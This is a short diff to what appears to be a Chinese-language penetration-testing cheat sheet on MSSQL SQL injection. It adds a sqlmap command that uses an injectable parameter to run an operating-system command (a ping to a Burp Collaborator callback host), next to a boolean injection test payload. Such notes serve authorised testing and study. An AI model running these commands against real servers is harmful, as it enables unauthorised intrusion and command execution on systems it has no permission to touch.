@@ -61,3 +61,13 @@ mssql
 1 AND 1726=1726
 ```
 
+
+
+## SQLMAP 语句收集
+
+SQL Server执行命令:
+
+```
+sqlmap -r request.txt --force-ssl -p pramater --level 5 --risk 2 -dbms="Microsoft SQL Server" --os-cmd="ping http://your.burpcollaborator.net"
+```
+
